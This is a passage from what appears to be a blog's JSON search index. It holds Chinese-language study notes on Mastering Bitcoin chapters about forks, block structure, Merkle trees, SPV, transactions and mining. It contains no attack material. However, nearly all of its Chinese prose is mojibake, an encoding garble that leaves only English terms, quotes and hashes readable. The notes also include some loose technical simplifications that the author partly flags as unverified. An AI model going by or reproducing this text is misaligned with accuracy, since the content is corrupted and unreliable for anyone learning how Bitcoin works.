èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº†decentralised consensus mechanismçš„å››ä¸ªæ­¥éª¤ï¼Œè¿™æ˜¯æ•´ä¸€ä¸ªbitcoinçš„åŸºçŸ³ï¼Œä½†æ˜¯éšç€æ—¶ä»£çš„å˜åŒ–ï¼ŒæŠ€æœ¯ä»¥åŠéœ€æ±‚çš„æ”¹å˜ï¼Œæ•´ä¸€ä¸ªbitcoinçš„ç³»ç»Ÿä¹Ÿå°†ä¸æ–­æ›´æ–°å’Œè¿›æ­¥ï¼Œä½†æ˜¯å»ä¸­å¿ƒåŒ–ç³»ç»Ÿä»¥åŠæœºåˆ¶çš„å‡çº§ï¼Œå°†ä¼šè¢«ä¸€èˆ¬ä¸­å¿ƒåŒ–å¼€å‘ç®¡ç†çš„è½¯ä»¶å‡çº§è¦éš¾å¾—å¤šã€‚ Forksè¿™ä¸ªæ¦‚å¿µæˆ‘ä»¬åœ¨ä¹‹å‰å·²ç»æåˆ°è¿‡äº†ï¼Œä¸€èˆ¬ä¼šå‡ºç°åœ¨ä¸¤ä¸ªç«äº‰çš„blockçš„å‡ºç°ä¸­ï¼Œè®©blockchainäº§ç”Ÿäº†åˆ†æ”¯ã€‚ æˆ‘ä»¬æ¥ä¸‹æ¥è¦ä»‹ç»çš„ä¸¤ä¸ªæ¦‚å¿µ Hard Forks ï¼Œä»¥åŠ Soft Forks ä¹Ÿæ˜¯ç›¸åŒçš„ç»“æœï¼Œä»–ä»¬ä¹Ÿä¼šåˆ›é€ åˆ†æ”¯ï¼Œä½†æ˜¯æ„ä¹‰ä¸åŒï¼Œè¿™æ˜¯ä¸ºäº†å¯¹Consensus rulesè¿›è¡Œæ”¹å˜ Hard Forks æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥ä»‹ç»Hard forksæ˜¯å¦‚ä½•å®ç°ä¸è¿è¡Œçš„ ä¸‹å›¾å±•ç°çš„æ˜¯ä¸€ä¸ªblockchainï¼Œåœ¨Block4çš„ä½ç½®å‡ºç°äº†ä¸€ä¸ªæ™®é€šçš„forkï¼Œåœ¨ç«äº‰ä¸­4aè·èƒœäº†ï¼Œå› ä¸ºblock5å…ˆè¢«æ·»åŠ äº†ï¼Œå› æ­¤æœ‰4açš„æˆä¸ºäº†ä¸»é“¾ é‚£ä¹ˆåœ¨Block6ä¹‹åå‘ç”Ÿçš„å°±æ˜¯ Hard Forks ï¼Œåœ¨Block6ä¹‹åï¼Œä¸€éƒ¨åˆ†clientè¿›è¡Œäº†ç³»ç»Ÿçš„å‡çº§ï¼Œå¹¶é‡‡ç”¨äº†æ–°çš„ consensus ruleï¼Œå‡è®¾æ–°çš„è§„åˆ™æ”¹å˜äº†transactionä¸­ï¼Œç”¨åœ¨unlocking scriptä¸­çš„signatureç”Ÿæˆç®—æ³•è¢«æ”¹å˜äº†ï¼Œå½“ä½¿ç”¨æ–°çš„ç®—æ³•æ„å»ºçš„transactionè¢«å¹¿æ’­å‡ºå»ä¹‹åï¼Œåªæœ‰é‡‡ç”¨æ–°è§„åˆ™çš„mining nodeèƒ½å¤ŸéªŒè¯å¹¶å¤„ç†è¿™æ¡transactionï¼Œè¿›è€Œèšé›†åˆ°candidate blockå½“ä¸­å»ã€‚ é‚£ä¹ˆå¯¹äºé‚£äº›æ²¡æœ‰å‡çº§çš„nodeï¼Œä»–ä»¬ä¼šç›´æ¥æ‹’ç»è¿™ç§transactionï¼Œå› ä¸ºåœ¨ä»–ä»¬çš„æ ¸å¯¹æœºåˆ¶å½“ä¸­ï¼Œè¿™æ¡transactionæ˜¯ä¸åˆæ³•çš„ã€‚ä»–ä»¬ä¼šæ‹’ç»æ‰€æœ‰æ–°è§„åˆ™ä¸‹çš„transaction ä»¥åŠblockï¼Œæ–°çš„blockä¹Ÿä¼šè¢«ä»–ä»¬è§†ä¸ºorphan blockï¼Œæ­¤åè¿™ä¸¤æ¡åˆ†æ”¯å°†ç‹¬ç«‹è¿è¡Œï¼Œäº’ä¸å…¼å®¹ã€‚  Soft Forks Soft forkså‡†ç¡®æ¥è¯´å¹¶ä¸æ˜¯ä¸€ä¸ªå…¸å‹çš„forkï¼Œå³å…¶ä¸ä¼šä½¿blockchainäº§ç”Ÿåˆ†æ”¯ã€‚ Hard forkså¯¹äºconsensus rulesçš„æ”¹å˜æ˜¯ä¸è€ç‰ˆæœ¬çš„è§„åˆ™äº’ä¸å…¼å®¹çš„,å¯ä»¥è¯´æ˜¯æœ‰æ‰€åˆ›æ–°ï¼Œæ–°è€ç‰ˆæœ¬äº’ç›¸æ— æ³•ç†è§£ï¼Œè€Œç›¸åçš„ï¼Œsoft forkså¯¹äºå¯¹è€ç‰ˆæœ¬çš„consensus rulesåšå‡ºé™åˆ¶ï¼Œå³åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šè¿›è¡Œé™åˆ¶ä¸ä¿®æ”¹ï¼Œå…¶ä½œç”¨èŒƒå›´å°äºè€ç‰ˆæœ¬çš„å†…å®¹ã€‚å› æ­¤æ–°è€ç‰ˆæœ¬ä»ç„¶å¯ä»¥äº’ç›¸ç†è§£ï¼Œtransactionå’Œblockçš„éªŒè¯ä¸æ·»åŠ ä¹Ÿå¯ä»¥ç»§ç»­è¿›è¡Œã€‚ ","date":"2022-05-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_10/","title":"Mastering Bitcoin 2nd Edition Chapter 10: Mining and Consensus"},{"content":"Mastering Bitcoin 2nd Edition Chapter 9: The Blockchain Introduction åœ¨è¿™ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†è¦ä»‹ç»blockchainåŒºå—é“¾çš„æ¦‚å¿µï¼ŒåŒºå—é“¾é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¾ˆå¤šçš„blockä¸²è”åœ¨ä¸€èµ·ï¼Œå½¢æˆäº†ä¸€æ¡é•¿é•¿çš„é“¾å­ã€‚ åœ¨å®é™…æƒ…å†µä¸­ï¼Œblockchainä½¿ç”¨äº†stackæ ˆçš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªblockï¼Œæˆ‘ä»¬ç§°ä¸º genesis block è¢«æ”¾åœ¨æ ˆåº•ï¼Œç„¶åéšç€æ–°çš„blockçš„äº§ç”Ÿï¼Œæ…¢æ…¢ä¸€ä¸ªä¸€ä¸ªå‹å…¥æ ˆã€‚ æ¯ä¸€ä¸ªblockï¼ˆå‡ºäº†genesis blockï¼‰éƒ½æœ‰ä¸€ä¸ª parent block ä¹Ÿå°±æ˜¯çˆ¶åŒºå—ï¼ŒåŒæ—¶æ¯ä¸€ä¸ªblockéƒ½æœ‰ä¸€ä¸ªblock headerï¼Œå’Œæˆ‘ä»¬ç†ŸçŸ¥çš„TCP headerä¸€æ ·ï¼Œé‡Œé¢å¯ä»¥æœ‰å¾ˆå¤šçš„fieldsï¼Œå…¶ä¸­å°±æœ‰ä¸€ä¸ªfieldå«åš previous block hash ï¼ŒæŒ‡ç¤ºäº†å…¶çˆ¶åŒºå—çš„hash è¿™é‡Œæˆ‘è®²ä¸€ä¸‹è‡ªå·±å¯¹hashçš„ç†è§£ï¼Œå°±æ˜¯æœ¬èº«æ¯ä¸€ä¸ªblock headeréƒ½ä¼šåŒ…å«å¾ˆå¤šçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡hashçš„æ–¹æ³•å°†è¿™äº›å¤æ‚çš„ä¿¡æ¯è½¬åŒ–ä¸ºä¸€æ¡å”¯ä¸€çš„å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªblockçš„block headerä¸­æœ‰å…¶çˆ¶åŒºå—çš„hashï¼Œé‚£ä¹ˆå½“å…¶å†è¢«hashä¿å­˜çš„æ—¶å€™ï¼Œå°±ä¼šæ”¶åˆ°çˆ¶åŒºå—çš„hashçš„å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœçˆ¶åŒºå—çš„hashæ”¹å˜äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€ç³»åˆ—çš„å­åŒºå—çš„hashéƒ½ä¼šéšä¹‹å‘ç”Ÿæ”¹å˜ã€‚ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆblockchainå¦‚æ­¤å®‰å…¨ï¼Œå› ä¸ºå¦‚æœä½ ä¼å›¾ç¯¡æ”¹ä¸€ä¸ªblockçš„å†…å®¹ï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šå¼•å‘æ•´ä¸ªä¸€ä¸ªblockchainçš„é‡æ–°è®¡ç®—ï¼Œè€Œè¿™æ ·çš„è®¡ç®—æ˜¯ä¸å¯èƒ½å®Œæˆçš„ï¼Œè¶Šé•¿çš„é“¾è¶Šéš¾å®ç°ï¼Œæ‰€ä»¥å°±åƒæˆ‘ä»¬åœ¨ä¹‹å‰çš„ç« èŠ‚ä¸­æåˆ°çš„é‚£æ ·ï¼Œåˆ°äº†6ä¸ªä»¥ä¸Šçš„blockæˆ‘ä»¬å°±å¯ä»¥è¯´æ˜¯å®‰å…¨äº†ã€‚è¿™å°±å’Œåœ°å±‚ä¸€æ ·ï¼Œè¶Šåœ¨ä¸Šé¢çš„åœ°è´¨å±‚å°±è¶Šå®¹æ˜“å‘ç”Ÿæ”¹å˜ï¼Œæ”¶åˆ°å­£èŠ‚æ°”å€™çš„å½±å“ï¼Œè€Œè¶ŠåŸ‹åœ¨ä¸‹é¢çš„åœ°è´¨å±‚å°±è¶Šç¨³å®šï¼Œè¶Šä¸å®¹æ˜“æ”¶åˆ°å½±å“ã€‚ ä¸€ä¸ªblockä¼šå¯¹åº”ä¸€ä¸ªçˆ¶åŒºå—ï¼Œä½†ä¸€ä¸ªblockå¯ä»¥æ‹¥æœ‰å¾ˆå¤šçš„å­åŒºå—ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¯´çš„Forkï¼Œè¿™ä¸ªæ¦‚å¿µæˆ‘ä»¬ä¼šåœ¨åé¢ä¸€èµ·å­¦ä¹ åˆ°ã€‚ Blockçš„ç»“æ„  ä¸€ä¸ªblockçš„æ„æˆ  block header  transactions       Block header   previous block hashï¼Œç”¨æ¥æŒ‡å‘çˆ¶åŒºå—çš„hash   a set of metadata: difficulty, timestamp, and nonce, è¿™äº›æ˜¯åœ¨æŒ–çŸ¿ä¸­äº§ç”Ÿçš„ metadata   merkle tree root, ç”¨æ¥æ€»ç»“å½“å‰blockçš„æ‰€æœ‰transaction     Block identifiers æˆ‘ä»¬æœ‰ä¸¤ç§åŠæ³•æ¥æŒ‡ä»£ä¸€ä¸ªblockï¼š   block hashï¼Œæˆ–è€…å‡†ç¡®çš„æ¥è¯´æ˜¯block header hash,å› ä¸ºæ˜¯å°†block headerç”¨SHA256 hashä¸¤è¾¹çš„ç»“æœ è¿™é‡Œç»†å¿ƒçš„æœ‹å‹å¯èƒ½ä¼šå‘ç°ï¼Œåœ¨blockçš„æ•°æ®ç»“æ„å½“ä¸­ï¼Œå¹¶æ²¡æœ‰åŒ…å«å½“å‰block hashçš„ä¿¡æ¯ï¼Œå› ä¸ºå…¶æ˜¯ç”±æ¯ä¸€ä¸ªæ”¶åˆ°å½“å‰blockçš„nodeæ¥è®¡ç®—ï¼Œå¹¶ä¿å­˜åœ¨å¦å¤–çš„æ•°æ®åº“ä¸­çš„metadata   block height, ç¬¬ä¸€ä¸ªblockçš„heightå°±æ˜¯0ï¼Œåé¢å°±è¶Šæ¥è¶Šé«˜ï¼Œå½“ç„¶è¿™ä¸æ˜¯å”¯ä¸€çš„ï¼Œä¹‹åæˆ‘ä»¬åœ¨Forkä¸­ä¼šè®²åˆ°     Genesis Block Genesis blockä¹Ÿå°±æ˜¯æ‰€æœ‰blockçš„ç¥–å…ˆï¼Œå…¶äº2009å¹´è¢«Satoshi Nakamotoæ‰€åˆ›å»ºï¼Œå¹¶é™„å¸¦æœ‰ä¸€æ¡éšè—çš„ä¿¡æ¯ï¼Œ â€œThe Times 03/Jan/2009 Chancellor on brink of second bailout for banks.â€ é€šè¿‡å¼•ç”¨äº†æ³°æ™¤å£«æŠ¥çš„æ ‡é¢˜æ¥æŒ‡ç¤ºäº†å…¶æœ€æ—©åˆ›å»ºçš„æ—¶é—´ï¼ŒåŒæ—¶ç”¨ä»¥è°ƒä¾ƒå…¨çƒæ­£åœ¨ç»å†çš„è´§å¸å±æœºã€‚ Genesis Blockçš„hashå€¼å¦‚ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ä¸€ä¸ªåŒºå—æŸ¥è¯¢ç½‘ç«™ä¸Šæ‰¾åˆ°å®ƒçš„ä¿¡æ¯ 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f https://www.blockchain.com/btc/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f åŒºå—é“¾ä¸­é“¾æ¥æ–°çš„åŒºå— æ¯ä¸€ä¸ªBitcoin full nodeséƒ½åœ¨æœ¬åœ°ä¿å­˜äº†å®Œæ•´çš„åŒºå—é“¾çš„å‰¯æœ¬ï¼Œä»genesis blockå¼€å§‹åˆ°æœ€æ–°çš„åŒºå—ï¼Œå½“æ”¶åˆ°æ–°çš„åŒºå—çš„æ—¶å€™ï¼Œæ¯ä¸€ä¸ªnodeå°±ä¼šéªŒè¯è¿™ä¸ªblockå¹¶æ·»åŠ åˆ°æœ¬åœ°çš„blockchainä¸Šé¢å»ï¼ŒéªŒè¯çš„æ–¹æ³•åˆ™æ˜¯æ ¸å¯¹previous block hashçš„å€¼æ˜¯å¦ä¸ºæœ¬åœ°blockchainçš„æœ€åä¸€ä¸ªåŒºå—çš„hashï¼ˆæœ‰å¾…è€ƒè¯ï¼Œæˆ‘è§‰å¾—æ˜¯ä¸æ˜¯å¤ªç®€å•äº†ä¸€ç‚¹ï¼ŒåæœŸå¯èƒ½ä¼šä¿®æ”¹ï¼Œå¦‚æœå‘ç°é”™è¯¯æ²¡æœ‰ä¿®æ”¹ï¼Œè¯·è”ç³»æˆ‘ä¿®æ”¹ï¼‰  Merkle Trees è®°å¾—æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡æ¯ä¸€ä¸ªBlockä¸­éƒ½åŒ…å«äº†æ‰€æœ‰çš„Transactionsï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾ç»´æŠ¤æ‰€æœ‰çš„è¿™äº›transactionséœ€è¦èŠ±è´¹å¤§é‡çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬å°±ä¼šé‡‡ç”¨Merkle Treesè¿™ä¸ªæ•°æ®ç»“æ„ï¼Œé¡¾åæ€ä¹‰æ˜¯ä¸€ä¸ªTreeçš„ç»“æ„ï¼Œç”±rootï¼Œnodesä»¥åŠleavesç»„æˆï¼Œæ¥ç®€åŒ–å¯¹äºtransactionsçš„ç»´æŠ¤ Merkle Treesçš„ç›®çš„å°±æ˜¯å°†æ‰€æœ‰çš„Transactionçš„hashï¼ˆdouble-SHA256ï¼‰ä½œä¸ºæ ‘çš„leavesï¼Œå¹¶å°†æ¯ä¸€å¯¹transactionçš„hashç»„åˆèµ·æ¥å†è¿›è¡Œhashï¼Œé€’å½’å¾—ä¸æ–­hashï¼Œæœ€ç»ˆå¾—åˆ° merkle root æ¥è¡¨ç¤ºæ‰€æœ‰çš„transactionçš„summary ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå½“æˆ‘ä»¬æœ‰A, B, C, Då››ä¸ªtransactionsï¼Œé‚£ä»–ä»¬çš„Hashå°±æ˜¯ï¼ŒH_A, H_B, H_C and H_Dï¼Œå°†ä»–ä»¬ä¸¤æ¥é‚£ä¸ªé…å¯¹å†æ¬¡Hashï¼Œæœ€ç»ˆå¾—åˆ°Merkle Rootï¼ˆå¦‚ä½•transactionçš„æ•°é‡æ˜¯å•æ•°ï¼Œé‚£ä¹ˆå°±é‡å¤æœ€åä¸€ä¸ªleavesæ¥å®ç°å¹³è¡¡æ ‘ï¼‰ H_A = SHA256(SHA256(Transaction A)) H_AB = SHA256(SHA256(H_A + H_B))  ç†è§£è¿™ä¸ªç»“æ„éå¸¸çš„ç®€å•ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å°±è¦é—®ä¸€ä¸ªé—®é¢˜ï¼Œè¿™æœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿ é¦–å…ˆå› ä¸ºæ˜¯æ ‘çš„ç»“æ„ï¼Œå› æ­¤åœ¨æŸ¥è¯¢ä¸€ä¸ªç‰¹å®šçš„èŠ‚ç‚¹å°±å°†ç®—æ³•çš„å¤æ‚åº¦ä»Né™ä½åˆ°äº†log(N)çš„æ°´å¹³ æƒ³è±¡ä¸€ä¸ªåœºæ™¯ï¼Œé¦–å…ˆæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯é çš„Merkle Root(å¦‚ä¸‹å›¾çš„ç»“æ„),ç„¶åæˆ‘ä»¬æƒ³è¦éªŒè¯Transaction Kåœ¨è¿™ä¸ªblockå½“ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥åªåˆ©ç”¨H_L, HIJ, H_MNOP, H_ABCDEFGHçš„ä¿¡æ¯ï¼Œå°±å¯ä»¥å’ŒH_Kä¸€èµ·ç®—å‡ºæœ€åçš„Merkle Rootæ¥æ ¸å¯¹æ˜¯å¦æ­£ç¡®ã€‚  è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å¼•å‡ºä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼šSimplified Payment Verification (SPV) Simplified Payment Verification (SPV) å°±åƒæˆ‘ä»¬ä¹‹å‰è¯´çš„ï¼ŒFull nodeä¼šè®°å½•å¹¶å®æ—¶ç»´æŠ¤æ‰€æœ‰çš„transactionï¼Œä½†æ˜¯SPV nodesä½œä¸ºä¸€ä¸ªè½»é‡çº§çš„nodeï¼Œåªéœ€è¦è®°å½•å’Œç»´æŠ¤æ‰€æœ‰çš„block headerså°±å¤Ÿäº†ï¼Œå› ä¸ºå…¶ä¸­å°±æœ‰å¯é çš„Merkle rootä¿¡æ¯ï¼Œæ¯å½“æˆ‘ä»¬æƒ³è¦éªŒè¯ä¸€ä¸ªtransactionæ˜¯å¦å­˜åœ¨çš„æ—¶å€™ï¼ŒSPVåªéœ€è¦å‘blockchain networkè¯·æ±‚å¯¹åº”çš„éœ€è¦éªŒè¯çš„hashå€¼ï¼Œå°±å¯ä»¥è¿›è¡Œå®ŒæˆéªŒè¯ã€‚ ","date":"2022-05-12T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_9/","title":"Mastering Bitcoin 2nd Edition Chapter 9: The Blockchain"},{"content":"Mastering Bitcoin 2nd Edition Chapter 2: How Bitcoin Works Bitcoin transactions Terms  Transaction Move value from transaction inputs to transaction outputs å°†å¤šä¸ª bitcoin value è½¬ç§»ç»™å¤šä¸ªoutputsåœ°å€ Input: reference to a previous transaction\u0026rsquo;s output, showing where the value is coming from Walleté‡Œé¢çš„bitcoinéƒ½æ¥è‡ªäºä¹‹å‰çš„ transaction çš„ outputï¼Œä½¿ç”¨çš„æ—¶å€™å°±æ˜¯å¼•ç”¨ä¹‹å‰ outputsçš„åœ°å€ Output: directs a specific value to new owner\u0026rsquo;s bitcoin address, and can include a change output back to the original owner Bitcoin valueå‘é€åˆ°æ–°çš„æ‹¥æœ‰è€…çš„åœ°å€ï¼ŒåŒæ—¶ä¸€éƒ¨åˆ†æ‰¾é›¶å›åˆ°åŸæœ‰è€…çš„åœ°å€ Transaction as double-entry bookkeeping   Change æ‰¾é›¶ ä¸ç‰©ç†è´§å¸ä½¿ç”¨ç±»ä¼¼ï¼Œå½“ä½œä¸ºinputçš„bitcoin valueå¤§äºå®é™…æ‰€éœ€è¦çš„outputçš„å€¼ï¼Œé‚£ä¹ˆç”±äºä¸èƒ½æŠŠä¸€ä¸ªbitcoin valueæ‹†å¼€ï¼Œå› æ­¤outputé™¤äº†åŸæ¥è¦æ±‚çš„å€¼ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–°çš„bitcoin valueè¿”å›ç»™åŸæœ‰çš„è´¦æˆ·ï¼Œå‡ä½¿ç”¨æ–°çš„åœ°å€  Transaction fee The slight difference between input and outputs It is collected by the miner as a fee for validating and including the transaction in a block to be recorded on the blockchain Transaction output åä¼šæ‰£é™¤ä¸€å®šçš„ transcation fee,ç”¨äºä½œä¸ºmineréªŒè¯å’Œå°†transactionåŠ å…¥blockçš„å¥–åŠ±  \u0026ldquo;Spending\u0026rdquo; sign a transaction that transfers value from a previous transaction over to a new owner identified by a bitcoin address ä½¿ç”¨ç”¨æˆ·çš„ key æ¥ç¡®è®¤ä¸€æ¬¡transaction  Transaction chains æ‰€æœ‰å½“å‰æ‹¥æœ‰è€…æ‰€æ‹¥æœ‰çš„bitcoin value å‡æ¥è‡ªäºä¸Šä¸€æ¬¡ transactionçš„ outputï¼Œè¿™äº› bitcoin valueå°†ä¼šä½œä¸ºä¸‹ä¸€æ¬¡ transaction çš„ input    Transaction forms   Most common transaction\næœ€æ™®é€šçš„ transactionï¼Œinputçš„value å¤§äºoutputï¼Œå› æ­¤ä¸€éƒ¨åˆ†è½¬äº¤ç»™æ–°çš„ownerï¼Œä¸€éƒ¨åˆ†æ‰¾é›¶è¿”å›åŸæ¥çš„åœ°å€      Transaction aggregating funds\nå½“æœ‰å¾ˆå¤šâ€œé›¶é’±â€çš„æ—¶å€™ï¼Œå‡‘é½ï¼ˆaggregateï¼‰å¾ˆå¤šçš„inputsè½¬äº¤ç»™æ–°çš„owner      Transaction distributing funds\nä¸€ä»½æˆ–å¤šä»½inputséœ€è¦è½¬äº¤ç»™å¤šä¸ªownersï¼Œä¾‹å¦‚å‘å·¥èµ„(payroll)    Constructing a Transaction Getting the Right Inputs: Most wallets keep track of all the available outputs belonging to addresses in the wallet Wallet application queries the bitcoin network to retrieve this information For example, use HTTP GET command to a specific URL to return all the unspent transaction outputs for an address Wallet application can construct transactions even if it is completely offline å…³äºTransactionçš„å·¥ä½œå®Œå…¨æ˜¯ç”±ç”¨æˆ·é€‰æ‹©çš„wallet applicationæ¥å®Œæˆçš„ï¼Œé‚£ä¹ˆåœ¨è·å–æ­£ç¡®çš„inputsçš„æ—¶å€™ å¦‚æœç”¨æˆ·é€‰æ‹©çš„walletæ˜¯ä¸€ä¸ªfull nodeï¼Œé‚£ä¹ˆwalletå°±ä¼šç›´æ¥å»æŸ¥è¯¢bitcoin network ä¸­çš„å†…å®¹ï¼› å¦‚æœç”¨æˆ·é€‰æ‹©çš„æ˜¯ä¸€ä¸ªlightweight çš„walletï¼Œé‚£ä¹ˆå®ƒåªä¼šè¿½è¸ªç”¨æˆ·ä¸ªäººçš„unspent outputs ç„¶åè¿›è¡Œè½¬è´¦ï¼Œè¿™æ—¶å€™ä¸éœ€è¦ç½‘ç»œä¹Ÿå¯ä»¥è¿›è¡Œï¼Œå°±åƒåœ¨å®¶é‡Œå†™äº†ä¸€å¼ æ”¯ç¥¨ï¼Œå¯ä»¥ç¨åå†äº¤ç»™é“¶è¡Œä¸€æ ·ï¼Œè¿™é‡Œåœ¨æœ¬åœ°ç¦»çº¿å†™å¥½äº†transactionçš„inputså’Œoutputsï¼Œéšåå†äº¤ç»™bitcoin network ä¹Ÿå¯ä»¥ Creating outputs \u0026ldquo;A transaction output is created in the form of a script that creates an encumbrance on the value and can only be redeemed by the introduction of a solution to the script.\u0026rdquo; \u0026ldquo;Aliceâ€™s transaction output will contain a script that says something like, â€œThis output is payable to whoever can present a signature from the key corresponding to Bobâ€™s public address.â€ Because only Bob has the wallet with the keys corresponding to that address, only Bobâ€™s wallet can present such a signature to redeem this output. Alice will therefore â€œencumberâ€ the output value with a demand for a signature from Bob.\u0026rdquo; åˆ›å»ºoutputs: Alice åˆ›å»ºä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬ä¼šå®ç°ï¼šå°†ä¸€éƒ¨åˆ†çš„inputsæŠµæŠ¼åœ¨bitcoin network ä¸Šï¼Œéšåç­‰å¾…Bob æ¥èµå›ã€‚é‚£ä¹ˆèµå›å°±éœ€è¦Bob æä¾›ä»–å¯¹åº”çš„keyæ¥è¿›è¡Œç­¾åï¼Œåªè¦ç­¾åæ­£ç¡®å°±å¯ä»¥èµå›è¿™éƒ¨åˆ†çš„ bitcoin value åŒæ—¶transaction ä¼šäº§ç”Ÿtransaction fee ç”¨æ¥æ”¯ä»˜ miner å¯¹transactionè¿›è¡ŒéªŒè¯å’Œè®°è´¦çš„å¥–åŠ±ï¼Œè¿™ä¸ª trasaction fee é€šå¸¸ä¼šåœ¨æ‰¾é›¶ change é‡Œæ‰£é™¤ Bitcoin Mining è®°è´¦ è½¬å‘äº¤æ˜“ï¼šæœ€ç»ˆçš„ç›®çš„æ˜¯å°†æ¯ä¸€æ¬¡äº¤æ˜“éƒ½è®°å½•åœ¨block chain ä¸Šé¢ æ‰€æœ‰å‚ä¸åˆ°bitcoin network ä¸­çš„ç»ˆç«¯éƒ½å«åšbitcoin node ä»–ä»¬éƒ½é€šè¿‡bitcoin protocol æ¥è¿›è¡Œäº¤æµ å½“Aliceçš„wallet å°†ä¸€ä¸ªtransaction å‘é€åˆ°å¦ä¸€ä¸ªbitcoin node çš„æ—¶å€™ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šéªŒè¯è¿™ä¸ªtransaction æ˜¯å¦å±äºè‡ªå·±ï¼Œå› ä¸ºä»–ä»¬éƒ½å¯ä»¥ç”¨è‡ªå·±çš„keyæ¥éªŒè¯ï¼Œç›´åˆ°ä¼ é€’åˆ°Bob å½“ä¸€ä¸ªbitcoin node æ”¶åˆ°äº†ä¹‹å‰æ²¡æœ‰è§è¿‡çš„transaction çš„æ—¶å€™ï¼Œä»–ä»¬å°±ä¼šåšflooding æ¥ç¡®ä¿å¤§éƒ¨åˆ†çš„èŠ‚ç‚¹éƒ½èƒ½æ”¶åˆ°è¿™ä¸ªtransaction è¿™é‡Œæœ‰ä¸€ä¸ªå¸¸è§çš„è¯¯åŒºå°±æ˜¯ï¼ŒBob éœ€è¦ç­‰å¾…10minæˆ–è€…60minçš„æ—¶é—´ï¼Œç­‰å¾…transactionè¢«è®°è´¦ä¹‹åï¼Œæ‰èƒ½å®Œæˆå’–å•¡çš„äº¤ä»˜ï¼Œå®é™…ä¸Šåªéœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ï¼ŒBob æ‰€æ‹¥æœ‰çš„ bitcoin node å°±ä¼šå¾—çŸ¥æœ‰ä¸€ä¸ªå±äºä»–çš„å¾…èµå›çš„outputs, è¿™å·²ç»æ˜¯ååˆ†å¯é çš„äº† æŒ–çŸ¿ çŸ¿å·¥è´Ÿæ‹…é«˜æ€§èƒ½çš„æœºå™¨ä»¥åŠè¿è¡Œæ‰€éœ€è¦çš„ç”µè´¹æ¥è¿›è¡ŒæŒ–çŸ¿ï¼Œä¸»è¦çš„å·¥ä½œæ˜¯éªŒè¯ Proof-of-Work â€œThe algorithm for Proof-of-Work involves repeatedly hashing the header of the block and a random number with the SHA256 cryptographic algorithm until a solution matching a predetermined pattern emerges.â€ çŸ¿å·¥ä¹‹å‰éƒ½å¯ä»¥äº’ç›¸åˆä½œï¼Œé€šè¿‡ mining pool æ¯æ¬¡å½“bitcoin network ä¸­æœ‰bitcoin node æäº¤ä¸€ä¸ªæ–°çš„transaction ï¼Œè¿™äº›transactionå°±ä¼šè¢«æ”¾åˆ°pool of unverified transactions å½“ä¸­ã€‚ æ¯ä¸ªçŸ¿å·¥å¼€å§‹æŒ–çŸ¿çš„ç›®çš„éƒ½æ˜¯ä¸ºäº†åˆ›é€ ä¸€ä¸ªå±äºè‡ªå·±çš„block, ç„¶åå°†è¿™ä¸ªblock æ·»åŠ åˆ°blockchain ä¸Šé¢å» å› æ­¤ä»–ä»¬ä¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ª candidate block, ç„¶åå¼€å§‹éªŒè¯æ‰€æœ‰å½“å‰å­˜åœ¨äº pool of unverified çš„ transactions, åŒæ—¶ä»–ä»¬ä¼šæ·»åŠ ä¸€æ¡æ–°çš„transaction which æŒ‡å‘ä»–ä»¬çš„åœ°å€ï¼Œè¿™ä¸ªtransaction æ‰€åŒ…å«çš„bitcoin value å°±æ˜¯ä¸€ä¸ªæ–°çš„block çš„å¥–åŠ±ä»¥åŠæ‰€æœ‰çš„transaction fee ï¼Œç›¸å½“äºæ˜¯é“¶è¡Œå°äº†æ–°çš„é’±è¿˜æœ‰æ‰€æœ‰è½¬è´¦çš„æ‰‹ç»­è´¹ï¼Œå½“ä»–ä»¬è°ç¬¬ä¸€ä¸ªå®Œæˆäº† proof of work algorithmçš„è®¡ç®—ï¼Œå°±å¯ä»¥å°†ä»–ä»¬æ‰€åˆ›é€ çš„ candidate block æ·»åŠ åˆ°block chain çš„æœ«å°¾å»æˆä¸ºæ–°çš„blockï¼Œå…¶ä»–äººéªŒè¯äº†å…¶æ­£ç¡®æ€§ä¹‹åï¼Œå°±ä¼šè½¬è€Œåˆ›å»ºæ–°çš„candidate blockæ¥è®¡ç®—æ–°çš„block ä¸€ä¸ªå¾ˆå¥½çš„æ¯”å–»å°±æ˜¯proof of work å°±æ˜¯ä¸€ä¸ªå¤§å‹çš„æ•°ç‹¬æ¸¸æˆï¼Œé€šè¿‡å¢åŠ è¡Œå’Œåˆ—çš„å¤§å°å¯ä»¥å¾ˆå®¹æ˜“çš„å¢åŠ 